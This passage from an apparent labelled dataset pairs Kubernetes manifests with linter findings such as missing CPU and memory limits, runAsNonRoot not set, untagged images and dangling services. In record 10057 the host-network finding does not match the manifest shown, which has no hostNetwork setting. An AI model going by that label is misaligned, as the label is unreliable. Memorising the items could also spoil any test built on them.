    "violation_text": "container \"nginx-ingress-lb\" has memory limit 0"
  },
  {
    "id": "10035",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "10036",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"luksa/batch-job\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10037",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "10038",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "10039",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "10040",
    "manifest_path": "data/manifests/the_stack_sample/sample_3861.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: batch-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: batch-job\n    spec:\n      containers:\n      - name: main\n        image: luksa/batch-job\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "10041",
    "manifest_path": "data/manifests/the_stack_sample/sample_3862.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: avtandilko/hipster-paymentservice:v0.0.2\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10042",
    "manifest_path": "data/manifests/the_stack_sample/sample_3862.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: avtandilko/hipster-paymentservice:v0.0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"paymentservice\" does not have a read-only root file system"
  },
  {
    "id": "10043",
    "manifest_path": "data/manifests/the_stack_sample/sample_3862.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: avtandilko/hipster-paymentservice:v0.0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"paymentservice\" is not set to runAsNonRoot"
  },
  {
    "id": "10044",
    "manifest_path": "data/manifests/the_stack_sample/sample_3862.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: avtandilko/hipster-paymentservice:v0.0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"paymentservice\" has cpu request 0"
  },
  {
    "id": "10045",
    "manifest_path": "data/manifests/the_stack_sample/sample_3862.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: avtandilko/hipster-paymentservice:v0.0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"paymentservice\" has memory limit 0"
  },
  {
    "id": "10046",
    "manifest_path": "data/manifests/the_stack_sample/sample_3863.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: sdbcontroller\n    visualize: 'true'\n  name: sdbcontroller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: sdbpod\n        visualize: 'true'\n    spec:\n      containers:\n      - image: gcr.io/kubernetestests/simpleservicewithdb:01\n        name: sdb\n        ports:\n        - name: sdb\n          containerPort: 8080\n          hostPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sdb\" does not have a read-only root file system"
  },
  {
    "id": "10047",
    "manifest_path": "data/manifests/the_stack_sample/sample_3863.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: sdbcontroller\n    visualize: 'true'\n  name: sdbcontroller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: sdbpod\n        visualize: 'true'\n    spec:\n      containers:\n      - image: gcr.io/kubernetestests/simpleservicewithdb:01\n        name: sdb\n        ports:\n        - name: sdb\n          containerPort: 8080\n          hostPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sdb\" is not set to runAsNonRoot"
  },
  {
    "id": "10048",
    "manifest_path": "data/manifests/the_stack_sample/sample_3863.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: sdbcontroller\n    visualize: 'true'\n  name: sdbcontroller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: sdbpod\n        visualize: 'true'\n    spec:\n      containers:\n      - image: gcr.io/kubernetestests/simpleservicewithdb:01\n        name: sdb\n        ports:\n        - name: sdb\n          containerPort: 8080\n          hostPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sdb\" has cpu request 0"
  },
  {
    "id": "10049",
    "manifest_path": "data/manifests/the_stack_sample/sample_3863.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: sdbcontroller\n    visualize: 'true'\n  name: sdbcontroller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: sdbpod\n        visualize: 'true'\n    spec:\n      containers:\n      - image: gcr.io/kubernetestests/simpleservicewithdb:01\n        name: sdb\n        ports:\n        - name: sdb\n          containerPort: 8080\n          hostPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sdb\" has memory limit 0"
  },
  {
    "id": "10050",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ably-publisher\" is using an invalid container image, \"tomably/go-redis-ably-publisher:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10051",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10052",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ably-publisher\" does not have a read-only root file system"
  },
  {
    "id": "10053",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ably-publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "10054",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ably-publisher\" has cpu request 0"
  },
  {
    "id": "10055",
    "manifest_path": "data/manifests/the_stack_sample/sample_3864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ably-publisher\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ably-publisher\n  template:\n    metadata:\n      labels:\n        app: ably-publisher\n    spec:\n      containers:\n      - name: ably-publisher\n        image: tomably/go-redis-ably-publisher:latest\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        - name: ABLY_KEY\n          value: INSERT_API_KEY_HERE\n        - name: RATE_LIMIT\n          value: '50'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ably-publisher\" has memory limit 0"
  },
  {
    "id": "10056",
    "manifest_path": "data/manifests/the_stack_sample/sample_3867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\nspec:\n  type: NodePort\n  selector:\n    app: wp\n  ports:\n  - protocol: TCP\n    port: 3306\n    targetPort: 3306\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:wp])"
  },
  {
    "id": "10057",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10058",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"alpine\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10059",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alpine\" does not have a read-only root file system"
  },
  {
    "id": "10060",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "10061",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alpine\" has cpu request 0"
  },
  {
    "id": "10062",
    "manifest_path": "data/manifests/the_stack_sample/sample_3868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ssh\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ssh\n  template:\n    metadata:\n      labels:\n        app: ssh\n    spec:\n      containers:\n      - name: alpine\n        image: alpine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alpine\" has memory limit 0"
  },
  {
    "id": "10063",
    "manifest_path": "data/manifests/the_stack_sample/sample_3870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hashicat-metadata\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hashicat-metadata\n  template:\n    metadata:\n      labels:\n        app: hashicat-metadata\n        version: v1\n    spec:\n      containers:\n      - name: hashicat-metadata\n        image: nicholasjackson/fake-service:v0.10.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MESSAGE\n          value: '{\"enable_ratings\":\"True\",\"caption\":\"Welcome to Nic''s Meowlicious\n            App\"}'\n        - name: SERVER_TYPE\n          value: http\n        - name: NAME\n          value: hashicat-metadata\n        - name: LISTEN_ADDR\n          value: 0.0.0.0:9090\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hashicat-metadata\" does not have a read-only root file system"
  },
  {
    "id": "10064",
    "manifest_path": "data/manifests/the_stack_sample/sample_3870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hashicat-metadata\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hashicat-metadata\n  template:\n    metadata:\n      labels:\n        app: hashicat-metadata\n        version: v1\n    spec:\n      containers:\n      - name: hashicat-metadata\n        image: nicholasjackson/fake-service:v0.10.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MESSAGE\n          value: '{\"enable_ratings\":\"True\",\"caption\":\"Welcome to Nic''s Meowlicious\n            App\"}'\n        - name: SERVER_TYPE\n          value: http\n        - name: NAME\n          value: hashicat-metadata\n        - name: LISTEN_ADDR\n          value: 0.0.0.0:9090\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hashicat-metadata\" is not set to runAsNonRoot"
  },
  {
    "id": "10065",
    "manifest_path": "data/manifests/the_stack_sample/sample_3870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hashicat-metadata\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hashicat-metadata\n  template:\n    metadata:\n      labels:\n        app: hashicat-metadata\n        version: v1\n    spec:\n      containers:\n      - name: hashicat-metadata\n        image: nicholasjackson/fake-service:v0.10.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MESSAGE\n          value: '{\"enable_ratings\":\"True\",\"caption\":\"Welcome to Nic''s Meowlicious\n            App\"}'\n        - name: SERVER_TYPE\n          value: http\n        - name: NAME\n          value: hashicat-metadata\n        - name: LISTEN_ADDR\n          value: 0.0.0.0:9090\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hashicat-metadata\" has cpu request 0"
  },
  {
    "id": "10066",
    "manifest_path": "data/manifests/the_stack_sample/sample_3870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hashicat-metadata\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hashicat-metadata\n  template:\n    metadata:\n      labels:\n        app: hashicat-metadata\n        version: v1\n    spec:\n      containers:\n      - name: hashicat-metadata\n        image: nicholasjackson/fake-service:v0.10.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MESSAGE\n          value: '{\"enable_ratings\":\"True\",\"caption\":\"Welcome to Nic''s Meowlicious\n            App\"}'\n        - name: SERVER_TYPE\n          value: http\n        - name: NAME\n          value: hashicat-metadata\n        - name: LISTEN_ADDR\n          value: 0.0.0.0:9090\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hashicat-metadata\" has memory limit 0"
  },
  {
    "id": "10067",
    "manifest_path": "data/manifests/the_stack_sample/sample_3872.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: maps\n  name: maps\nspec:\n  ports:\n  - name: maps-p80\n    port: 80\n    targetPort: 80\n  selector:\n    name: maps\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:maps])"
  },
  {
    "id": "10068",
    "manifest_path": "data/manifests/the_stack_sample/sample_3873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: '{{ .Release.Name }}-appwrite'\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    app: '{{ .Release.Name }}-appwrite'\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][app]: Invalid value: \"{{ .Release.Name }}-appwrite\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "10069",
    "manifest_path": "data/manifests/the_stack_sample/sample_3874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sonarqube-service\n  namespace: sonarqube\nspec:\n  type: ClusterIP\n  selector:\n    app: sonarqube-pod\n  ports:\n  - name: sonarqube\n    port: 9000\n    targetPort: 9000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sonarqube-pod])"
  },
  {
    "id": "10070",
    "manifest_path": "data/manifests/the_stack_sample/sample_3875.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jupyter-web-app\" does not have a read-only root file system"
  },
  {
    "id": "10071",
    "manifest_path": "data/manifests/the_stack_sample/sample_3875.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jupyter-web-app-service-account\" not found"
  },
  {
    "id": "10072",
    "manifest_path": "data/manifests/the_stack_sample/sample_3875.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jupyter-web-app\" is not set to runAsNonRoot"
  },
  {
    "id": "10073",
    "manifest_path": "data/manifests/the_stack_sample/sample_3875.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jupyter-web-app\" has cpu request 0"
  },
  {
    "id": "10074",
    "manifest_path": "data/manifests/the_stack_sample/sample_3875.yaml",
